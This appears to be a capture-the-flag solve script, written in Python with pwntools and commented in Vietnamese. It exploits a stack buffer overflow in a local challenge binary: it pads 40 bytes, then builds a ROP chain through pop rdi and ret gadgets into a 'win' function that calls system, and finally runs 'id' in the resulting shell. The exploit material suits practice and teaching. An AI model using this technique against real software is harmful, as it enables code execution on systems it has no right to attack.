#!/usr/bin/env python3
# Challenge 2 (trung binh): ret2win mot tham so, win goi system.
# Offset do bang cyclic = 40 (buf[32] + 8). Can 1 ret de can stack 16 byte.
from pwn import *

context.binary = elf = ELF('./chall2', checksec=False)
context.log_level = 'info'

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

io = process('./chall2')
io.sendafter(b'chall2>\n', flat(
    b'A' * 40,                  # offset do bang cyclic: 40
    pop_rdi, 0xcafed00d,
    ret,                        # can stack 16 byte truoc system
    elf.sym['win'],
))
# cho banner "[+] ok" roi moi gui lenh (tranh race send som)
io.sendlineafter(b'[+] ok\n', b'echo ===SHELL_OK===; id; exit')
print(io.recvall(timeout=3).decode(errors='replace'))
